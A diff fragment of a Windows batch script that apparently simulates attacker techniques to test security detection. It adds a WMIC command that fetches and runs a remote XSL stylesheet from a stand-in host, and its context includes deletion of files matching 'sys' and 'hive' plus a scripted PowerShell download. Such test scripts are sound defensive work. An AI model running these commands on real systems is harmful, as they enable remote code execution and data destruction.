@@ -283,6 +283,8 @@ svchost.exe -k netsvcs
 ECHO ============================
 cmd.exe /c powershell.exe Invoke-WebRequest http://www.pdf995.com/samples/pdf.pdf -UserAgent $userAgent
 ECHO ============================
+wmic.exe os get /format:"http://blah/foo.xsl"
+ECHO ============================
 del *sys* & del *hive*
 ECHO ============================
 ping -n 10 127.0.0.1
